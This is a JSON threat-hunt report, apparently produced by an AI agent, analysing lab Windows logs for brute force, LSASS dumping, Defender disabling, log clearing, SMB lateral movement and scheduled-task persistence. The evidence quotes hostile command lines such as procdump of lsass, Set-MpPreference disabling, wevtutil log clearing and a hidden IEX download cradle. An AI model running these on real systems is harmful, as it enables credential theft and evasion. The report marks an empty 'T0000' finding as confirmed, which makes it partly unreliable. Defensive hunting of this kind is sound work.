@@ -1,0 +1,637 @@
+{
+  "report": {
+    "report_title": "Threat Hunt Incident Report",
+    "executive_summary": "Autonomous threat hunt completed. Multiple ATT&CK techniques confirmed.",
+    "threat_assessment": {
+      "overall_severity": "high",
+      "attack_confirmed": true,
+      "threat_actor_type": "Unknown",
+      "attack_objective": "Unknown"
+    },
+    "findings": [
+      {
+        "id": 1,
+        "title": "Brute Force Attack Against Administrator Account",
+        "description": "Detected sustained brute force attack targeting the Administrator account from 192.168.1.105 over SMB (LogonType 3). 15 failed authentication attempts occurred within 5 minutes (02:30:03 to 02:34:27) with varying source ports, indicating systematic credential guessing via network-based SMB protocol. All attempts were from the same source IP but different ports, consistent with credential stuffing attack pattern.",
+        "technique_id": "T1110.001",
+        "severity": "critical",
+        "evidence": [
+          "EventID=4625 | 02:30:03 | Administrator | 192.168.1.105:64710 | Unknown user name or bad password",
+          "EventID=4625 | 02:30:13 | Administrator | 192.168.1.105:52869 | Unknown user name or bad password",
+          "EventID=4625 | 02:30:36 | Administrator | 192.168.1.105:63503 | Unknown user name or bad password",
+          "EventID=4625 | 02:30:49 | Administrator | 192.168.1.105:64323 | Unknown user name or bad password",
+          "EventID=4625 | 02:32:02 | Administrator | 192.168.1.105:58482 | Unknown user name or bad password",
+          "EventID=4625 | 02:32:33 | Administrator | 192.168.1.105:56656 | Unknown user name or bad password",
+          "EventID=4625 | 02:32:42 | Administrator | 192.168.1.105:62783 | Unknown user name or bad password",
+          "EventID=4625 | 02:32:45 | Administrator | 192.168.1.105:53985 | Unknown user name or bad password",
+          "EventID=4625 | 02:32:58 | Administrator | 192.168.1.105:51106 | Unknown user name or bad password",
+          "EventID=4625 | 02:34:27 | Administrator | 192.168.1.105:63226 | Unknown user name or bad password"
+        ],
+        "timestamp": "2026-06-03T15:15:02.805303"
+      },
+      {
+        "id": 2,
+        "title": "Credential Dumping from LSASS Process",
+        "description": "Detected multiple indicators of credential dumping attacks targeting LSASS process. PowerShell reconnaissance of LSASS process (02:46:20), followed by direct process access from PowerShell (Sysmon Event 10 at 02:49:11 with GrantedAccess 0x1010), and execution of procdump.exe to dump LSASS memory (02:49:27). This represents a complete credential dumping attack chain targeting cached authentication material.",
+        "technique_id": "T1003.001",
+        "severity": "critical",
+        "evidence": [
+          "EventID=4688 | 02:46:20 | powershell.exe -c Get-Process | Where-Object {$_.Name -eq 'lsass'}",
+          "EventID=10 | 02:49:11 | Sysmon Process Access | PowerShell targeting lsass.exe | GrantedAccess=0x1010",
+          "EventID=4688 | 02:49:27 | procdump.exe -ma lsass.exe lsass.dmp | ParentProcess=cmd.exe"
+        ],
+        "timestamp": "2026-06-03T15:15:02.805466"
+      },
+      {
+        "id": 3,
+        "title": "PowerShell-Based Command Execution and Reconnaissance",
+        "description": "Extensive use of PowerShell for malicious command execution and system reconnaissance. Attack chain includes: execution policy bypass commands, system enumeration (hostname, ipconfig, net user), process investigation, and remote code execution attempts. Multiple instances of -Exec Bypass, -NoP (NoProfile), -NonI (NonInteractive), and -W Hidden (Hidden Window) flags indicating obfuscation and evasion techniques. Evidence includes atomic red team module imports and download-execute pattern attempts.",
+        "technique_id": "T1059.001",
+        "severity": "critical",
+        "evidence": [
+          "EventID=4688 | 02:42:02 | powershell.exe -exec bypass -c Import-Module C:\\AtomicRedTeam\\invoke-atomicredteam",
+          "EventID=4688 | 02:42:42 | pwsh.exe -c [System.Reflection.Assembly]::LoadWithPartialName",
+          "EventID=4688 | 02:43:19 | powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX(New-Object Net.WebClient).DownloadStr",
+          "EventID=1 | 02:45:26 | ipconfig /all executed via PowerShell parent",
+          "EventID=1 | 02:46:13 | net user executed via PowerShell parent",
+          "EventID=1 | 02:42:44 | hostname executed via PowerShell parent"
+        ],
+        "timestamp": "2026-06-03T15:15:02.821972"
+      },
+      {
+        "id": 4,
+        "title": "Lateral Movement via SMB Network Shares",
+        "description": "No description provided",
+        "technique_id": "T0000",
+        "severity": "medium",
+        "evidence": [],
+        "timestamp": "2026-06-03T15:15:02.822005"
+      },
+      {
+        "id": 5,
+        "title": "Lateral Movement via SMB Network Shares - Detailed",
+        "description": "Detected SMB-based lateral movement attacks targeting remote hosts 192.168.1.110 and 192.168.1.115 on port 445. Direct evidence includes: (1) net use command at 03:01:45 attempting to connect to \\\\192.168.1.110\\C$ with embedded Administrator credentials (Lab123!), (2) Sysmon network connection events showing SMB connections to 192.168.1.115 and 192.168.1.110 on port 445. This indicates active lateral movement exploitation using stolen or guessed credentials.",
+        "technique_id": "T1021.002",
+        "severity": "critical",
+        "evidence": [
+          "EventID=4688 | 03:01:45 | net use \\\\192.168.1.110\\C$ /user:Administrator Lab123!",
+          "EventID=3 | 03:01:37 | Sysmon Network Connection | net.exe to 192.168.1.115:445 TCP",
+          "EventID=3 | 03:03:47 | Sysmon Network Connection | net.exe to 192.168.1.110:445 TCP"
+        ],
+        "timestamp": "2026-06-03T15:15:12.776205"
+      },
+      {
+        "id": 6,
+        "title": "Defense Evasion and Security Tool Disabling",
+        "description": "Multiple coordinated attacks on Windows security infrastructure. Evidence includes: (1) PowerShell-based disabling of Windows Defender real-time monitoring and behavior monitoring (02:55:58 and 02:44:54), (2) Registry modification to disable Windows Defender AntiSpyware via registry policy (02:56:28), (3) Registry modification adding persistence mechanism in Run key (03:06:20), and (4) Security event log clearing via wevtutil cl Security (03:15:53). This represents comprehensive defense evasion to hide malicious activity and disable protections.",
+        "technique_id": "T1562.001",
+        "severity": "critical",
+        "evidence": [
+          "EventID=4688 | 02:44:54 | powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
+          "EventID=4688 | 02:55:58 | powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true",
+          "EventID=13 | 02:56:28 | Registry | powershell.exe modified HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware",
+          "EventID=13 | 03:06:20 | Registry | reg.exe modified HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
+          "EventID=4688 | 03:15:53 | wevtutil cl Security - clearing event logs"
+        ],
+        "timestamp": "2026-06-03T15:15:12.776333"
+      },
+      {
+        "id": 7,
+        "title": "Persistence via Scheduled Task Creation",
+        "description": "Attacker created a malicious scheduled task disguised as legitimate Windows Update activity. Task named 'Microsoft\\\\Windows\\\\WindowsUpdate\\\\UpdateCheck' was created by Administrator at 02:53:15 with PowerShell payload containing IEX (Invoke-Expression) command for remote code download and execution. This provides persistence mechanism for maintaining access and re-executing malicious code.",
+        "technique_id": "T1053.005",
+        "severity": "critical",
+        "evidence": [
+          "EventID=4698 | 02:53:15 | Scheduled Task Created | SubjectUserName=Administrator | TaskName=\\Microsoft\\Windows\\WindowsUpdate\\UpdateCheck | Command=powershell.exe -NoP -W Hidden -c IEX(New-Object..."
+        ],
+        "timestamp": "2026-06-03T15:15:12.776398"
+      }
+    ],
+    "attack_timeline": [
+      {
+        "timestamp": "2026-06-03T15:15:02.805325",
+        "event": "Brute Force Attack Against Administrator Account",
+        "technique_id": "T1110.001",
+        "severity": "critical"
+      },
+      {
+        "timestamp": "2026-06-03T15:15:02.805472",
+        "event": "Credential Dumping from LSASS Process",
+        "technique_id": "T1003.001",
+        "severity": "critical"
+      },
+      {
+        "timestamp": "2026-06-03T15:15:02.821978",
+        "event": "PowerShell-Based Command Execution and Reconnaissance",
+        "technique_id": "T1059.001",
+        "severity": "critical"
+      },
+      {
+        "timestamp": "2026-06-03T15:15:02.822007",
+        "event": "Lateral Movement via SMB Network Shares",
+        "technique_id": "T0000",
+        "severity": "medium"
+      },
+      {
+        "timestamp": "2026-06-03T15:15:12.776220",
+        "event": "Lateral Movement via SMB Network Shares - Detailed",
+        "technique_id": "T1021.002",
+        "severity": "critical"
+      },
+      {
+        "timestamp": "2026-06-03T15:15:12.776340",
+        "event": "Defense Evasion and Security Tool Disabling",
+        "technique_id": "T1562.001",
+        "severity": "critical"
+      },
+      {
+        "timestamp": "2026-06-03T15:15:12.776403",
+        "event": "Persistence via Scheduled Task Creation",
+        "technique_id": "T1053.005",
+        "severity": "critical"
+      }
+    ],
+    "mitre_attack_mapping": [
+      {
+        "technique_id": "T1110.001",
+        "technique_name": "T1110.001",
+        "tactic": "Unknown",
+        "confirmed": true
+      },
+      {
+        "technique_id": "T1003.001",
+        "technique_name": "T1003.001",
+        "tactic": "Unknown",
+        "confirmed": true
+      },
+      {
+        "technique_id": "T1059.001",
+        "technique_name": "T1059.001",
+        "tactic": "Unknown",
+        "confirmed": true
+      },
+      {
+        "technique_id": "T0000",
+        "technique_name": "T0000",
+        "tactic": "Unknown",
+        "confirmed": true
+      },
+      {
+        "technique_id": "T1021.002",
+        "technique_name": "T1021.002",
+        "tactic": "Unknown",
+        "confirmed": true
+      },
+      {
+        "technique_id": "T1562.001",
+        "technique_name": "T1562.001",
+        "tactic": "Unknown",
+        "confirmed": true
+      },
+      {
+        "technique_id": "T1053.005",
+        "technique_name": "T1053.005",
+        "tactic": "Unknown",
+        "confirmed": true
+      }
+    ],
+    "recommendations": [
+      {
+        "priority": "immediate",
+        "action": "Isolate affected host",
+        "rationale": "Active compromise detected"
+      }
+    ],
+    "hunt_statistics": {
+      "total_hypotheses": 5,
+      "confirmed": 5,
+      "rejected": 0,
+      "total_queries": 11,
+      "total_findings": 7,
+      "session_start": "2026-06-03T15:14:38.803481"
+    }
+  },
+  "raw_memory": {
+    "summary": {
+      "session_start": "2026-06-03T15:14:38.803481",
+      "total_hypotheses": 5,
+      "confirmed_hypotheses": 5,
+      "rejected_hypotheses": 0,
+      "total_queries": 11,
+      "total_findings": 7,
+      "false_positives": 0,
+      "confirmed_techniques": [
+        "T1110.001",
+        "T1003.001",
+        "T1059.001",
+        "T0000",
+        "T1021.002",
+        "T1562.001",
+        "T1053.005"
+      ],
+      "attack_timeline_events": 7
+    },
+    "hypotheses": [
+      {
+        "id": 1,
+        "hypothesis": "There may be brute force or password guessing activity targeting user accounts on WORKSTATION-01",
+        "technique_id": "T1110.001",
+        "priority": "high",
+        "status": "confirmed",
+        "created_at": "2026-06-03T15:14:43.603092",
+        "confidence": 0.95,
+        "updated_at": "2026-06-03T15:15:34.632468"
+      },
+      {
+        "id": 2,
+        "hypothesis": "There may be lateral movement attempts via SMB/network shares being exploited",
+        "technique_id": "T1021.002",
+        "priority": "high",
+        "status": "confirmed",
+        "created_at": "2026-06-03T15:14:43.630947",
+        "confidence": 0.75,
+        "updated_at": "2026-06-03T15:15:40.329495"
+      },
+      {
+        "id": 3,
+        "hypothesis": "There may be PowerShell abuse for malicious command execution and scripting",
+        "technique_id": "T1059.001",
+        "priority": "high",
+        "status": "confirmed",
+        "created_at": "2026-06-03T15:14:43.631003",
+        "confidence": 0.95,
+        "updated_at": "2026-06-03T15:15:45.342814"
+      },
+      {
+        "id": 4,
+        "hypothesis": "There may be defensive security tool disabling or tampering occurring",
+        "technique_id": "T1562.001",
+        "priority": "medium",
+        "status": "confirmed",
+        "created_at": "2026-06-03T15:14:43.631012",
+        "confidence": 0.98,
+        "updated_at": "2026-06-03T15:15:50.276086"
+      },
+      {
+        "id": 5,
+        "hypothesis": "There may be credential dumping from LSASS process memory",
+        "technique_id": "T1003.001",
+        "priority": "medium",
+        "status": "confirmed",
+        "created_at": "2026-06-03T15:14:43.631020",
+        "confidence": 0.95,
+        "updated_at": "2026-06-03T15:15:56.060922"
+      }
+    ],
+    "findings": [
+      {
+        "id": 1,
+        "title": "Brute Force Attack Against Administrator Account",
+        "description": "Detected sustained brute force attack targeting the Administrator account from 192.168.1.105 over SMB (LogonType 3). 15 failed authentication attempts occurred within 5 minutes (02:30:03 to 02:34:27) with varying source ports, indicating systematic credential guessing via network-based SMB protocol. All attempts were from the same source IP but different ports, consistent with credential stuffing attack pattern.",
+        "technique_id": "T1110.001",
+        "severity": "critical",
+        "evidence": [
+          "EventID=4625 | 02:30:03 | Administrator | 192.168.1.105:64710 | Unknown user name or bad password",
+          "EventID=4625 | 02:30:13 | Administrator | 192.168.1.105:52869 | Unknown user name or bad password",
+          "EventID=4625 | 02:30:36 | Administrator | 192.168.1.105:63503 | Unknown user name or bad password",
+          "EventID=4625 | 02:30:49 | Administrator | 192.168.1.105:64323 | Unknown user name or bad password",
+          "EventID=4625 | 02:32:02 | Administrator | 192.168.1.105:58482 | Unknown user name or bad password",
+          "EventID=4625 | 02:32:33 | Administrator | 192.168.1.105:56656 | Unknown user name or bad password",
+          "EventID=4625 | 02:32:42 | Administrator | 192.168.1.105:62783 | Unknown user name or bad password",
+          "EventID=4625 | 02:32:45 | Administrator | 192.168.1.105:53985 | Unknown user name or bad password",
+          "EventID=4625 | 02:32:58 | Administrator | 192.168.1.105:51106 | Unknown user name or bad password",
+          "EventID=4625 | 02:34:27 | Administrator | 192.168.1.105:63226 | Unknown user name or bad password"
+        ],
+        "timestamp": "2026-06-03T15:15:02.805303"
+      },
+      {
+        "id": 2,
+        "title": "Credential Dumping from LSASS Process",
+        "description": "Detected multiple indicators of credential dumping attacks targeting LSASS process. PowerShell reconnaissance of LSASS process (02:46:20), followed by direct process access from PowerShell (Sysmon Event 10 at 02:49:11 with GrantedAccess 0x1010), and execution of procdump.exe to dump LSASS memory (02:49:27). This represents a complete credential dumping attack chain targeting cached authentication material.",
+        "technique_id": "T1003.001",
+        "severity": "critical",
+        "evidence": [
+          "EventID=4688 | 02:46:20 | powershell.exe -c Get-Process | Where-Object {$_.Name -eq 'lsass'}",
+          "EventID=10 | 02:49:11 | Sysmon Process Access | PowerShell targeting lsass.exe | GrantedAccess=0x1010",
+          "EventID=4688 | 02:49:27 | procdump.exe -ma lsass.exe lsass.dmp | ParentProcess=cmd.exe"
+        ],
+        "timestamp": "2026-06-03T15:15:02.805466"
+      },
+      {
+        "id": 3,
+        "title": "PowerShell-Based Command Execution and Reconnaissance",
+        "description": "Extensive use of PowerShell for malicious command execution and system reconnaissance. Attack chain includes: execution policy bypass commands, system enumeration (hostname, ipconfig, net user), process investigation, and remote code execution attempts. Multiple instances of -Exec Bypass, -NoP (NoProfile), -NonI (NonInteractive), and -W Hidden (Hidden Window) flags indicating obfuscation and evasion techniques. Evidence includes atomic red team module imports and download-execute pattern attempts.",
+        "technique_id": "T1059.001",
+        "severity": "critical",
+        "evidence": [
+          "EventID=4688 | 02:42:02 | powershell.exe -exec bypass -c Import-Module C:\\AtomicRedTeam\\invoke-atomicredteam",
+          "EventID=4688 | 02:42:42 | pwsh.exe -c [System.Reflection.Assembly]::LoadWithPartialName",
+          "EventID=4688 | 02:43:19 | powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX(New-Object Net.WebClient).DownloadStr",
+          "EventID=1 | 02:45:26 | ipconfig /all executed via PowerShell parent",
+          "EventID=1 | 02:46:13 | net user executed via PowerShell parent",
+          "EventID=1 | 02:42:44 | hostname executed via PowerShell parent"
+        ],
+        "timestamp": "2026-06-03T15:15:02.821972"
+      },
+      {
+        "id": 4,
+        "title": "Lateral Movement via SMB Network Shares",
+        "description": "No description provided",
+        "technique_id": "T0000",
+        "severity": "medium",
+        "evidence": [],
+        "timestamp": "2026-06-03T15:15:02.822005"
+      },
+      {
+        "id": 5,
+        "title": "Lateral Movement via SMB Network Shares - Detailed",
+        "description": "Detected SMB-based lateral movement attacks targeting remote hosts 192.168.1.110 and 192.168.1.115 on port 445. Direct evidence includes: (1) net use command at 03:01:45 attempting to connect to \\\\192.168.1.110\\C$ with embedded Administrator credentials (Lab123!), (2) Sysmon network connection events showing SMB connections to 192.168.1.115 and 192.168.1.110 on port 445. This indicates active lateral movement exploitation using stolen or guessed credentials.",
+        "technique_id": "T1021.002",
+        "severity": "critical",
+        "evidence": [
+          "EventID=4688 | 03:01:45 | net use \\\\192.168.1.110\\C$ /user:Administrator Lab123!",
+          "EventID=3 | 03:01:37 | Sysmon Network Connection | net.exe to 192.168.1.115:445 TCP",
+          "EventID=3 | 03:03:47 | Sysmon Network Connection | net.exe to 192.168.1.110:445 TCP"
+        ],
+        "timestamp": "2026-06-03T15:15:12.776205"
+      },
+      {
+        "id": 6,
+        "title": "Defense Evasion and Security Tool Disabling",
+        "description": "Multiple coordinated attacks on Windows security infrastructure. Evidence includes: (1) PowerShell-based disabling of Windows Defender real-time monitoring and behavior monitoring (02:55:58 and 02:44:54), (2) Registry modification to disable Windows Defender AntiSpyware via registry policy (02:56:28), (3) Registry modification adding persistence mechanism in Run key (03:06:20), and (4) Security event log clearing via wevtutil cl Security (03:15:53). This represents comprehensive defense evasion to hide malicious activity and disable protections.",
+        "technique_id": "T1562.001",
+        "severity": "critical",
+        "evidence": [
+          "EventID=4688 | 02:44:54 | powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
+          "EventID=4688 | 02:55:58 | powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true",
+          "EventID=13 | 02:56:28 | Registry | powershell.exe modified HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware",
+          "EventID=13 | 03:06:20 | Registry | reg.exe modified HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
+          "EventID=4688 | 03:15:53 | wevtutil cl Security - clearing event logs"
+        ],
+        "timestamp": "2026-06-03T15:15:12.776333"
+      },
+      {
+        "id": 7,
+        "title": "Persistence via Scheduled Task Creation",
+        "description": "Attacker created a malicious scheduled task disguised as legitimate Windows Update activity. Task named 'Microsoft\\\\Windows\\\\WindowsUpdate\\\\UpdateCheck' was created by Administrator at 02:53:15 with PowerShell payload containing IEX (Invoke-Expression) command for remote code download and execution. This provides persistence mechanism for maintaining access and re-executing malicious code.",
+        "technique_id": "T1053.005",
+        "severity": "critical",
+        "evidence": [
+          "EventID=4698 | 02:53:15 | Scheduled Task Created | SubjectUserName=Administrator | TaskName=\\Microsoft\\Windows\\WindowsUpdate\\UpdateCheck | Command=powershell.exe -NoP -W Hidden -c IEX(New-Object..."
+        ],
+        "timestamp": "2026-06-03T15:15:12.776398"
+      }
+    ],
+    "attack_timeline": [
+      {
+        "timestamp": "2026-06-03T15:15:02.805325",
+        "event": "Brute Force Attack Against Administrator Account",
+        "technique_id": "T1110.001",
+        "severity": "critical"
+      },
+      {
+        "timestamp": "2026-06-03T15:15:02.805472",
+        "event": "Credential Dumping from LSASS Process",
+        "technique_id": "T1003.001",
+        "severity": "critical"
+      },
+      {
+        "timestamp": "2026-06-03T15:15:02.821978",
+        "event": "PowerShell-Based Command Execution and Reconnaissance",
+        "technique_id": "T1059.001",
+        "severity": "critical"
+      },
+      {
+        "timestamp": "2026-06-03T15:15:02.822007",
+        "event": "Lateral Movement via SMB Network Shares",
+        "technique_id": "T0000",
+        "severity": "medium"
+      },
+      {
+        "timestamp": "2026-06-03T15:15:12.776220",
+        "event": "Lateral Movement via SMB Network Shares - Detailed",
+        "technique_id": "T1021.002",
+        "severity": "critical"
+      },
+      {
+        "timestamp": "2026-06-03T15:15:12.776340",
+        "event": "Defense Evasion and Security Tool Disabling",
+        "technique_id": "T1562.001",
+        "severity": "critical"
+      },
+      {
+        "timestamp": "2026-06-03T15:15:12.776403",
+        "event": "Persistence via Scheduled Task Creation",
+        "technique_id": "T1053.005",
+        "severity": "critical"
+      }
+    ],
+    "queries_run": [
+      {
+        "query_type": "failed_logons",
+        "query": "failed_logons",
+        "result_count": 15,
+        "summary": "Found 15 failed logons",
+        "timestamp": "2026-06-03T15:14:45.314201"
+      },
+      {
+        "query_type": "event_id",
+        "query": "event_id:4688",
+        "result_count": 9,
+        "summary": "Found 9 events",
+        "timestamp": "2026-06-03T15:14:45.315281"
+      },
+      {
+        "query_type": "technique",
+        "query": "technique:T1059.001",
+        "result_count": 14,
+        "summary": "Found 14 events",
+        "timestamp": "2026-06-03T15:14:45.316781"
+      },
+      {
+        "query_type": "technique",
+        "query": "technique:T1021.002",
+        "result_count": 20,
+        "summary": "Found 20 events",
+        "timestamp": "2026-06-03T15:14:45.317751"
+      },
+      {
+        "query_type": "technique",
+        "query": "technique:T1003.001",
+        "result_count": 3,
+        "summary": "Found 3 events",
+        "timestamp": "2026-06-03T15:14:47.642118"
+      },
+      {
+        "query_type": "technique",
+        "query": "technique:T1562.001",
+        "result_count": 3,
+        "summary": "Found 3 events",
+        "timestamp": "2026-06-03T15:14:47.642543"
+      },
+      {
+        "query_type": "scheduled_tasks",
+        "query": "scheduled_tasks",
+        "result_count": 1,
+        "summary": "Found 1 scheduled task events",
+        "timestamp": "2026-06-03T15:14:47.642589"
+      },
+      {
+        "query_type": "registry",
+        "query": "registry_events",
+        "result_count": 2,
+        "summary": "Found 2 registry events",
+        "timestamp": "2026-06-03T15:14:47.642616"
+      },
+      {
+        "query_type": "network",
+        "query": "network_events",
+        "result_count": 2,
+        "summary": "Found 2 network events",
+        "timestamp": "2026-06-03T15:14:49.571521"
+      },
+      {
+        "query_type": "keyword",
+        "query": "keyword:wevtutil",
+        "result_count": 1,
+        "summary": "Found 1 events",
+        "timestamp": "2026-06-03T15:14:49.572611"
+      },
+      {
+        "query_type": "process_tree",
+        "query": "process:powershell.exe",
+        "result_count": 11,
+        "summary": "Found 11 events",
+        "timestamp": "2026-06-03T15:15:19.454636"
+      }
+    ],
+    "iteration_log": [
+      {
+        "iteration": 1,
+        "thought": "I'll investigate each hypothesis systematically. Let me start by examining the most critical findings.",
+        "action": "get_failed_logons({})",
+        "observation": "Found 15 matching events. Showing top 10:\n\n[1] EventID=4625 | Time=2024-06-15T02:30:03 | Host=WORKSTATION-01 | Data={\"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"CORP\", \"FailureReason\": \"Unknown user name or bad password\", \"LogonType\": \"3\", \"IpAddress\": \"192.168.1.105\", \"IpPort\": \"64710\"}",
+        "timestamp": "2026-06-03T15:14:45.314621"
+      },
+      {
+        "iteration": 1,
+        "thought": "I'll investigate each hypothesis systematically. Let me start by examining the most critical findings.",
+        "action": "search_by_event_id({\"event_id\": \"4688\"})",
+        "observation": "Found 9 matching events. Showing top 9:\n\n[1] EventID=4688 | Time=2024-06-15T02:55:58 | Host=WORKSTATION-01 | Data={\"NewProcessName\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMoni",
+        "timestamp": "2026-06-03T15:14:45.315658"
+      },
+      {
+        "iteration": 1,
+        "thought": "I'll investigate each hypothesis systematically. Let me start by examining the most critical findings.",
+        "action": "search_by_technique({\"technique_id\": \"T1059.001\"})",
+        "observation": "Found 14 matching events. Showing top 10:\n\n[1] EventID=4688 | Time=2024-06-15T02:55:58 | Host=WORKSTATION-01 | Data={\"NewProcessName\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMo",
+        "timestamp": "2026-06-03T15:14:45.317064"
+      },
+      {
+        "iteration": 1,
+        "thought": "I'll investigate each hypothesis systematically. Let me start by examining the most critical findings.",
+        "action": "search_by_technique({\"technique_id\": \"T1021.002\"})",
+        "observation": "Found 20 matching events. Showing top 10:\n\n[1] EventID=4688 | Time=2024-06-15T03:01:45 | Host=WORKSTATION-01 | Data={\"NewProcessName\": \"C:\\\\Windows\\\\System32\\\\net.exe\", \"CommandLine\": \"net use \\\\\\\\192.168.1.110\\\\C$ /user:Administrator Lab123!\", \"SubjectUserName\": \"Administrator\"}\n[2] EventID=1 | Tim",
+        "timestamp": "2026-06-03T15:14:45.318028"
+      },
+      {
+        "iteration": 2,
+        "thought": "Excellent! I'm finding substantial evidence across multiple hypotheses. Let me continue investigating the other key areas:",
+        "action": "search_by_technique({\"technique_id\": \"T1003.001\"})",
+        "observation": "Found 3 matching events. Showing top 3:\n\n[1] EventID=4688 | Time=2024-06-15T02:46:20 | Host=WORKSTATION-01 | Data={\"NewProcessName\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe -c \\\"Get-Process | Where-Object {$_.Name -eq 'lsass'}\\\"\", \"SubjectUser",
+        "timestamp": "2026-06-03T15:14:47.642169"
+      },
+      {
+        "iteration": 2,
+        "thought": "Excellent! I'm finding substantial evidence across multiple hypotheses. Let me continue investigating the other key areas:",
+        "action": "search_by_technique({\"technique_id\": \"T1562.001\"})",
+        "observation": "Found 3 matching events. Showing top 3:\n\n[1] EventID=13 | Time=2024-06-15T02:56:28 | Host=WORKSTATION-01 | Data={\"EventType\": \"SetValue\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"TargetObject\": \"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\DisableAntiSpyw",
+        "timestamp": "2026-06-03T15:14:47.642573"
+      },
+      {
+        "iteration": 2,
+        "thought": "Excellent! I'm finding substantial evidence across multiple hypotheses. Let me continue investigating the other key areas:",
+        "action": "get_scheduled_tasks({})",
+        "observation": "Found 1 matching events. Showing top 1:\n\n[1] EventID=4698 | Time=2024-06-15T02:53:15 | Host=WORKSTATION-01 | Data={\"SubjectUserName\": \"Administrator\", \"TaskName\": \"\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\UpdateCheck\", \"TaskContent\": \"<Actions><Exec><Command>powershell.exe</Command><Arguments>-NoP -W Hi",
+        "timestamp": "2026-06-03T15:14:47.642605"
+      },
+      {
+        "iteration": 2,
+        "thought": "Excellent! I'm finding substantial evidence across multiple hypotheses. Let me continue investigating the other key areas:",
+        "action": "get_registry_events({})",
+        "observation": "Found 2 matching events. Showing top 2:\n\n[1] EventID=13 | Time=2024-06-15T03:06:20 | Host=WORKSTATION-01 | Data={\"EventType\": \"SetValue\", \"Image\": \"C:\\\\Windows\\\\System32\\\\reg.exe\", \"TargetObject\": \"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\WindowsUpdate\", \"Details\": \"C:\\\\Users\\\\Admini",
+        "timestamp": "2026-06-03T15:14:47.642652"
+      },
+      {
+        "iteration": 3,
+        "thought": "Now let me get network events and check for log clearing:",
+        "action": "get_network_events({})",
+        "observation": "Found 2 matching events. Showing top 2:\n\n[1] EventID=3 | Time=2024-06-15T03:01:37 | Host=WORKSTATION-01 | Data={\"Image\": \"C:\\\\Windows\\\\System32\\\\net.exe\", \"DestinationIp\": \"192.168.1.115\", \"DestinationPort\": \"445\", \"User\": \"CORP\\\\Administrator\", \"Protocol\": \"tcp\"}\n[2] EventID=3 | Time=2024-06-15T03:",
+        "timestamp": "2026-06-03T15:14:49.571562"
+      },
+      {
+        "iteration": 3,
+        "thought": "Now let me get network events and check for log clearing:",
+        "action": "search_by_keyword({\"keyword\": \"wevtutil\"})",
+        "observation": "Found 1 matching events. Showing top 1:\n\n[1] EventID=4688 | Time=2024-06-15T03:15:53 | Host=WORKSTATION-01 | Data={\"NewProcessName\": \"C:\\\\Windows\\\\System32\\\\wevtutil.exe\", \"CommandLine\": \"wevtutil cl Security\", \"SubjectUserName\": \"Administrator\"}",
+        "timestamp": "2026-06-03T15:14:49.572849"
+      },
+      {
+        "iteration": 4,
+        "thought": "Perfect! Now I have comprehensive data. Let me confirm the findings with detailed evidence. I'll start documenting each confirmed malicious activity:",
+        "action": "confirm_finding({\"title\": \"Brute Force Attack Against Administrator Account\", \"description\": \"Detected sustained brute force attack targeting the Administrator accoun)",
+        "observation": "Finding #1 confirmed and added to report: Brute Force Attack Against Administrator Account",
+        "timestamp": "2026-06-03T15:15:02.805430"
+      },
+      {
+        "iteration": 4,
+        "thought": "Perfect! Now I have comprehensive data. Let me confirm the findings with detailed evidence. I'll start documenting each confirmed malicious activity:",
+        "action": "confirm_finding({\"title\": \"Credential Dumping from LSASS Process\", \"description\": \"Detected multiple indicators of credential dumping attacks targeting LSASS process.)",
+        "observation": "Finding #2 confirmed and added to report: Credential Dumping from LSASS Process",
+        "timestamp": "2026-06-03T15:15:02.821933"
+      },
+      {
+        "iteration": 4,
+        "thought": "Perfect! Now I have comprehensive data. Let me confirm the findings with detailed evidence. I'll start documenting each confirmed malicious activity:",
+        "action": "confirm_finding({\"title\": \"PowerShell-Based Command Execution and Reconnaissance\", \"description\": \"Extensive use of PowerShell for malicious command execution and sys)",
+        "observation": "Finding #3 confirmed and added to report: PowerShell-Based Command Execution and Reconnaissance",
+        "timestamp": "2026-06-03T15:15:02.821996"
+      },
+      {
+        "iteration": 4,
+        "thought": "Perfect! Now I have comprehensive data. Let me confirm the findings with detailed evidence. I'll start documenting each confirmed malicious activity:",
+        "action": "confirm_finding({\"title\": \"Lateral Movement via SMB Network Shares\"})",
+        "observation": "Finding #4 confirmed and added to report: Lateral Movement via SMB Network Shares",
+        "timestamp": "2026-06-03T15:15:02.822016"
+      },
+      {
+        "iteration": 5,
+        "thought": "Let me complete the lateral movement finding with the full details:",
+        "action": "confirm_finding({\"title\": \"Lateral Movement via SMB Network Shares - Detailed\", \"description\": \"Detected SMB-based lateral movement attacks targeting remote hosts 192)",
+        "observation": "Finding #5 confirmed and added to report: Lateral Movement via SMB Network Shares - Detailed",
+        "timestamp": "2026-06-03T15:15:12.776241"
+      },
+      {
+        "iteration": 5,
+        "thought": "Let me complete the lateral movement finding with the full details:",
+        "action": "confirm_finding({\"title\": \"Defense Evasion and Security Tool Disabling\", \"description\": \"Multiple coordinated attacks on Windows security infrastructure. Evidence inc)",
+        "observation": "Finding #6 confirmed and added to report: Defense Evasion and Security Tool Disabling",
